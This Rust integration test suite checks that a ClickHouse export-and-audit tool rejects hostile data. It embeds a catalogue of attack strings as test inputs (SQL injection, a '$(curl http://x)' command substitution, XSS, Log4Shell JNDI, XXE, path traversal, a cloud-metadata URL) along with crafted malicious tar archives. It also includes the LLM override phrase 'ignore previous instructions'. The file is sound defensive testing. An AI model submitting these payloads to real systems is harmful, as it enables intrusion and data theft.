//! The section 12 rehearsal corpus.
//!
//! > Nothing runs against real data until this passes.
//!
//! Every item the document lists, plus the additions this implementation makes. The ones that
//! **cannot** run here are named and `#[ignore]`d rather than quietly omitted -- section 12's
//! closing line is the standard: *"A failure mode with no owning control is a gap in this plan, not
//! an acceptable risk."* An item silently absent from a passing suite is exactly that gap.
//!
//! Everything here runs with **zero network and zero ClickHouse**, against `FakeRunner` and
//! `LocalStore`.

// Crate lints apply to integration tests too, and inner attributes do not inherit across files.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]

use std::path::Path;

use salvage::abort::ExitCode;
use salvage::audit::{AuditOptions, Mode, run_audit};
use salvage::clickhouse::ddl::{PinnedDdl, parse_create_table};
use salvage::export::plan::ClusterFacts;
use salvage::export::{ExportOptions, run_export};
use salvage::models::{Overrides, PagesJson, PayloadInventory};
use salvage::teardown::{Disposition, TeardownPlan, run_teardown};
use salvage::testkit::{FakeRunner, LocalStore, TarForge, gzip_concatenated, gzip_with_trailing};

const OVERRIDES: &str = include_str!("../overrides/typematrix.typematrix.toml");

fn ddl() -> PinnedDdl {
    parse_create_table(
        "CREATE TABLE db.t (`ts` DateTime, `id` UInt64, `body` String) \
         ENGINE = MergeTree ORDER BY (`ts`, `id`)",
    )
    .unwrap()
}

fn overrides() -> Overrides {
    let mut o: Overrides = toml::from_str(OVERRIDES).unwrap();
    o.cutoff_column = "ts".into();
    o.cursor_columns = Some(vec!["ts".into(), "id".into()]);
    o.columns.clear();
    o.columns.insert(
        "body".to_owned(),
        salvage::models::ColumnOverride {
            class: salvage::models::FreedomClass::Open,
            drop: false,
            pattern: None,
            max_len: Some(8192),
            enum_ids: None,
            hex: false,
            rotation_owner: None,
        },
    );
    o
}

fn facts(rows: u64) -> ClusterFacts {
    ClusterFacts {
        engine: "MergeTree".to_owned(),
        columns: Vec::new(),
        uncompressed_bytes: 1000,
        row_count: rows,
        parts_rows: rows,
    }
}

fn store(dir: &Path) -> LocalStore {
    std::fs::create_dir_all(dir.join("store")).unwrap();
    LocalStore::new(dir.join("store"))
}

fn page_bytes(bodies: &[&str]) -> Vec<u8> {
    let mut tsv = String::from("ts\tid\tbody\n");
    for (i, body) in bodies.iter().enumerate() {
        tsv.push_str(&format!("1785000000\t{}\t{body}\n", i + 1));
    }
    tsv.into_bytes()
}

fn export(dir: &Path, s: &LocalStore, bodies: &[&str]) -> PagesJson {
    let runner = FakeRunner::new().on("SELECT", page_bytes(bodies));
    run_export(
        &ddl(),
        &overrides(),
        &runner,
        s,
        &facts(u64::try_from(bodies.len()).unwrap()),
        1000,
        &ExportOptions {
            batch: "b1".to_owned(),
            work: dir.join("export"),
            bucket_prefix: "db.t/b1".to_owned(),
            dry_run: false,
            resume: false,
            contract_version: "rehearsal".to_owned(),
            git_commit: "rehearsal".to_owned(),
        },
    )
    .unwrap()
}

fn audit_opts(dir: &Path, mode: Mode) -> AuditOptions {
    AuditOptions {
        batch: "b1".to_owned(),
        work: dir.join("audit"),
        raw_prefix: "db.t/b1".to_owned(),
        clean_prefix: "clean/db.t/b1".to_owned(),
        mode,
        dry_run: false,
        contract_version: "rehearsal".to_owned(),
        git_commit: "rehearsal".to_owned(),
        shape_review_signoff: true,
        rotation_signoff: true,
    }
}

// -- item 1: every supported type -----------------------------------------------------------

#[test]
fn item_1_every_supported_type_parses_and_has_a_bound() {
    // The type matrix carries every type section 8.3 supports and every trap it names, including
    // the two item 1 calls out by name.
    let matrix = parse_create_table(include_str!("../ddl/typematrix.typematrix.sql")).unwrap();
    let over: Overrides = toml::from_str(OVERRIDES).unwrap();

    let mut declared = Vec::new();
    for column in &matrix.columns {
        let rules =
            salvage::clickhouse::types::rules_for(&column.ty, over.limits.max_array_elements)
                .unwrap_or_else(|e| panic!("{}: {e}", column.name.as_str()));
        assert!(!rules.columns.is_empty(), "{}", column.name.as_str());
        declared.push(column.declared_type.clone());
    }
    assert!(declared.iter().any(|t| t == "Array(Nullable(UInt8))"));
    assert!(
        declared
            .iter()
            .any(|t| t == "LowCardinality(Nullable(String))")
    );
    assert!(declared.iter().any(|t| t.starts_with("DateTime64(0)")));
    assert!(declared.iter().any(|t| t.contains("Nested(")));
}

// -- item 2: escapes ---------------------------------------------------------------------------

#[test]
fn item_2_malformed_and_alternative_escapes_reject_rather_than_normalise() {
    use salvage::clickhouse::tsv::decode_field;
    for bad in [&br"\a"[..], &br"\v"[..], &br"\x41"[..], &br"trailing\"[..]] {
        assert!(
            decode_field(bad).is_err(),
            "{:?} must reject, not normalise",
            String::from_utf8_lossy(bad)
        );
    }
    // And the canonical set still decodes, including the distinction that matters most.
    assert!(decode_field(br"\N").unwrap().is_null());
    assert!(!decode_field(br"\\N").unwrap().is_null());
}

// -- item 3: framing ---------------------------------------------------------------------------

#[test]
fn item_3_gzip_concatenation_and_trailing_bytes_reject() {
    let limits = overrides().limits;
    assert!(
        salvage::archive::read_single_gzip_member(
            &gzip_concatenated(b"benign", b"smuggled"),
            &limits
        )
        .is_err()
    );
    assert!(
        salvage::archive::read_single_gzip_member(&gzip_with_trailing(b"page", b"extra"), &limits)
            .is_err()
    );
}

#[test]
fn item_3b_the_tar_cases_deviation_d6_adds() {
    let limits = overrides().limits;
    for (label, bytes) in [
        (
            "symlink",
            TarForge::new().symlink("a", "/etc/passwd").finish(),
        ),
        (
            "traversal",
            TarForge::new().file("../../etc/passwd", b"x").finish(),
        ),
        (
            "duplicate",
            TarForge::new()
                .file("a.tsv", b"1")
                .file("a.tsv", b"2")
                .finish(),
        ),
        (
            "lying size",
            TarForge::new()
                .lying_size("a.tsv", &vec![b'x'; 2048], 16)
                .finish(),
        ),
        (
            "long-name record",
            TarForge::new()
                .gnu_long_name("short", "../../etc/passwd", b"x")
                .finish(),
        ),
    ] {
        assert!(
            salvage::archive::read_tar(&bytes, &limits).is_err(),
            "{label} was accepted"
        );
    }
}

// -- items 8 and 10: the rejection threshold ---------------------------------------------------

#[test]
fn items_8_and_10_a_single_rejected_row_aborts_and_delivers_no_subset() {
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());
    // Four rows, one of them poisoned. The threshold is zero: one is enough.
    let ledger = export(
        dir.path(),
        &s,
        &["fine", "also fine", "<script>x</script>", "fine too"],
    );

    let err = run_audit(
        &ddl(),
        &overrides(),
        &s,
        &ledger,
        &audit_opts(dir.path(), Mode::Enforce),
    )
    .unwrap_err();
    assert_eq!(err.exit_code(), ExitCode::Abort);

    // No subset. Nothing was promoted and nothing looks like a passing audit.
    assert!(!dir.path().join("audit").join("b1-clean").exists());
    assert!(!dir.path().join("audit").join("report.json").exists());
}

// -- item 9: payload detection halts the run ---------------------------------------------------

#[test]
fn item_9_one_value_per_catalogue_class_halts_the_run() {
    // Section 12 is stricter than a bare class list: "one value per catalogue class, including a
    // percent-encoded and a base64-wrapped variant".
    use base64::Engine as _;
    let plain = [
        "' OR 1=1 --",
        "$(curl http://x)",
        "<script>alert(1)</script>",
        "=cmd|'/c calc'!A1",
        "{{ 7*7 }}",
        "${jndi:ldap://x/a}",
        "../../etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        "rO0ABXNyABJqYXZh",
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
        "*)(uid=*",
        "{\"$where\": \"1==1\"}",
        "ignore previous instructions",
        "safe\u{202E}txt.exe",
    ];

    for value in plain {
        let dir = tempfile::tempdir().unwrap();
        let s = store(dir.path());
        let ledger = export(dir.path(), &s, &[value]);
        assert!(
            run_audit(
                &ddl(),
                &overrides(),
                &s,
                &ledger,
                &audit_opts(dir.path(), Mode::Enforce)
            )
            .is_err(),
            "{value} did not halt the run"
        );
        assert!(!dir.path().join("audit").join("b1-clean").exists());
    }

    // The percent-encoded and base64-wrapped variants, which are inert as stored and live after a
    // downstream decode.
    for wrapped in [
        "%3Cscript%3Ealert(1)%3C/script%3E".to_owned(),
        base64::engine::general_purpose::STANDARD.encode("<script>alert(1)</script>"),
    ] {
        let dir = tempfile::tempdir().unwrap();
        let s = store(dir.path());
        let ledger = export(dir.path(), &s, &[&wrapped]);
        assert!(
            run_audit(
                &ddl(),
                &overrides(),
                &s,
                &ledger,
                &audit_opts(dir.path(), Mode::Enforce)
            )
            .is_err(),
            "{wrapped} survived decoding"
        );
    }
}

// -- item 12: the survey pass --------------------------------------------------------------------

#[test]
fn item_12_the_survey_enumerates_every_finding_and_writes_nothing_forward() {
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());
    let ledger = export(
        dir.path(),
        &s,
        &[
            "<script>x</script>",
            "' OR 1=1 --",
            "${jndi:ldap://x}",
            "clean",
        ],
    );

    // Survey still fails -- "collect them all", not "tolerate them".
    assert!(
        run_audit(
            &ddl(),
            &overrides(),
            &s,
            &ledger,
            &audit_opts(dir.path(), Mode::Survey)
        )
        .is_err()
    );

    let inventory: PayloadInventory = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join("audit").join("PAYLOAD-INVENTORY.json")).unwrap(),
    )
    .unwrap();
    // All three planted values, not the first one and a halt.
    assert_eq!(inventory.columns[0].rows_matched, 3);
    assert!(!inventory.is_clear());
    assert!(!dir.path().join("audit").join("b1-clean").exists());
}

// -- addition A2: the two-pass diff ----------------------------------------------------------

#[test]
fn a2_two_passes_that_differ_abort_and_identical_ones_proceed() {
    use salvage::testkit::{HostileRunner, Hostility};
    let dir = tempfile::tempdir().unwrap();
    let runner = HostileRunner::new(Hostility::DifferentOnSecondCall).with_header("ts\tid\tbody");
    let err = run_export(
        &ddl(),
        &overrides(),
        &runner,
        &store(dir.path()),
        &facts(3),
        1000,
        &ExportOptions {
            batch: "b1".to_owned(),
            work: dir.path().join("export"),
            bucket_prefix: "db.t/b1".to_owned(),
            dry_run: false,
            resume: false,
            contract_version: "rehearsal".to_owned(),
            git_commit: "rehearsal".to_owned(),
        },
    )
    .unwrap_err();
    assert!(err.to_string().contains("passes disagree"), "{err}");

    // The deterministic runner proceeds, which is what makes the above meaningful.
    let clean = tempfile::tempdir().unwrap();
    let s = store(clean.path());
    assert_eq!(export(clean.path(), &s, &["fine"]).total_rows, 1);
}

// -- addition A7: pagination -------------------------------------------------------------------

#[test]
fn a7a_a_nullable_column_can_never_enter_the_cursor() {
    let nullable = parse_create_table(
        "CREATE TABLE db.t (`ts` DateTime, `maybe` Nullable(UInt64)) \
         ENGINE = MergeTree ORDER BY (`ts`, `maybe`)",
    )
    .unwrap();
    let mut over = overrides();
    over.cursor_columns = None;
    let err = salvage::pages::select_cursor(&nullable, &over).unwrap_err();
    assert!(err.to_string().contains("NULL"), "{err}");
}

#[test]
fn a7b_a_key_that_fails_its_bound_never_becomes_a_cursor() {
    // A row whose key parses as an injection attempt is rejected by the bound before it can be
    // rendered into the next seek predicate.
    let dir = tempfile::tempdir().unwrap();
    let runner = FakeRunner::new().on(
        "SELECT",
        b"ts\tid\tbody\n2026-01-01'; DROP TABLE x;--\t1\tfine\n".to_vec(),
    );
    let err = run_export(
        &ddl(),
        &overrides(),
        &runner,
        &store(dir.path()),
        &facts(1),
        1000,
        &ExportOptions {
            batch: "b1".to_owned(),
            work: dir.path().join("export"),
            bucket_prefix: "db.t/b1".to_owned(),
            dry_run: false,
            resume: false,
            contract_version: "rehearsal".to_owned(),
            git_commit: "rehearsal".to_owned(),
        },
    )
    .unwrap_err();
    assert_eq!(err.exit_code(), ExitCode::Abort);
    assert!(!dir.path().join("export").join("b1").exists());
}

#[test]
fn a7d_a_short_page_ends_the_run_and_the_totals_reconcile() {
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());
    let ledger = export(dir.path(), &s, &["a", "b", "c"]);
    assert_eq!(ledger.pages.len(), 1, "a short page terminates");
    assert!(ledger.reconciles());
}

#[test]
fn a7f_reconciliation_catches_a_server_claiming_more_than_it_streamed() {
    let dir = tempfile::tempdir().unwrap();
    let runner = FakeRunner::new().on("SELECT", page_bytes(&["a", "b"]));
    let err = run_export(
        &ddl(),
        &overrides(),
        &runner,
        &store(dir.path()),
        &facts(99),
        1000,
        &ExportOptions {
            batch: "b1".to_owned(),
            work: dir.path().join("export"),
            bucket_prefix: "db.t/b1".to_owned(),
            dry_run: false,
            resume: false,
            contract_version: "rehearsal".to_owned(),
            git_commit: "rehearsal".to_owned(),
        },
    )
    .unwrap_err();
    assert!(err.to_string().contains("do not agree"), "{err}");
}

#[test]
fn a7h_promotion_is_all_or_nothing_across_the_table_s_pages() {
    // One bad row anywhere in the batch and no page reaches the clean staging area.
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());
    let ledger = export(
        dir.path(),
        &s,
        &["fine", "fine", "${jndi:ldap://x}", "fine", "fine"],
    );
    assert!(
        run_audit(
            &ddl(),
            &overrides(),
            &s,
            &ledger,
            &audit_opts(dir.path(), Mode::Enforce)
        )
        .is_err()
    );
    assert!(!dir.path().join("audit").join("b1-clean").exists());
}

// -- item 6: generation pinning -----------------------------------------------------------------

#[test]
fn item_6_a_pinned_generation_that_does_not_exist_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());
    let mut ledger = export(dir.path(), &s, &["fine"]);
    ledger.pages[0].generation += 1;
    assert!(
        run_audit(
            &ddl(),
            &overrides(),
            &s,
            &ledger,
            &audit_opts(dir.path(), Mode::Enforce)
        )
        .is_err()
    );
}

// -- the whole chain -------------------------------------------------------------------------

#[test]
fn the_clean_path_runs_end_to_end_with_no_network_and_no_clickhouse() {
    let dir = tempfile::tempdir().unwrap();
    let s = store(dir.path());

    let ledger = export(dir.path(), &s, &["ordinary", "also ordinary", "third"]);
    assert!(ledger.reconciles());

    let report = run_audit(
        &ddl(),
        &overrides(),
        &s,
        &ledger,
        &audit_opts(dir.path(), Mode::Enforce),
    )
    .unwrap();
    assert!(report.is_clean());

    let promoted = dir.path().join("audit").join("b1-clean");
    assert!(promoted.join("MANIFEST.json").exists());
    assert!(promoted.join("quarantine.sql").exists());

    // Teardown closes it, and refuses to be a default.
    let md = run_teardown(
        &TeardownPlan {
            table: "db.t".to_owned(),
            batch: "b1".to_owned(),
            raw_prefix: "db.t/b1".to_owned(),
            disposition: Disposition::SnapshotThenWipe,
            owner: "R. Okonkwo".to_owned(),
            accepted: true,
            rotation_complete: true,
            dry_run: false,
        },
        &s,
    )
    .unwrap();
    assert!(md.contains("snapshot-then-wipe"));
    assert!(md.contains("soft delete"));
}

// -- named and skipped -------------------------------------------------------------------------
//
// These need a host this machine does not have. They are `#[ignore]`d rather than omitted so a
// passing suite does not read as full coverage. Run them on Q2 with `cargo test -- --ignored`.

#[test]
#[ignore = "needs the dummy ClickHouse on Q2 (section 12 item 5)"]
fn item_5_a_partial_insert_drops_the_staging_table_whole() {
    unimplemented!("kill an insert mid-stream; confirm the per-file staging table is dropped");
}

#[test]
#[ignore = "needs the dummy ClickHouse on Q2 (section 12 item 13)"]
fn item_13_preflight_catches_what_static_validation_misses() {
    unimplemented!("plant a value satisfying the contract regex but failing a real insert");
}

#[test]
#[ignore = "needs the dummy ClickHouse on Q2 (section 12 item 14)"]
fn item_14_the_shape_review_surfaces_a_planted_anomaly() {
    unimplemented!(
        "force a column constant and delete a day of rows; confirm the profile shows both"
    );
}

#[test]
#[ignore = "needs a ClickHouse with a locked-down user (addition A1c)"]
fn a1c_a_constraint_on_a_pinned_setting_errors_the_query() {
    unimplemented!("either we win the setting or the query errors; there is no quiet middle");
}

#[test]
#[ignore = "needs GCP (section 12 item 7, reduced set)"]
fn item_7_trust_boundary_denials() {
    unimplemented!("Q1 to raw read denied, Q1 to clean denied, Q2 to cluster denied");
}

#[test]
#[ignore = "needs GCP (addition A4)"]
fn a4_destination_alerts_fire() {
    unimplemented!("force a second generation and an out-of-band read");
}

#[test]
#[ignore = "not applicable: one validator, run once (deviation D3)"]
fn item_4_q2_compromise_simulation() {
    unimplemented!("there is no second validator to catch the first");
}

#[test]
#[ignore = "not applicable: no Q3 (deviation D2); transferred to the consumer in writing"]
fn item_11_a_payload_q2b_passed_is_caught_by_q3() {
    unimplemented!("CONSUMER-CONTRACT.md carries this obligation instead");
}
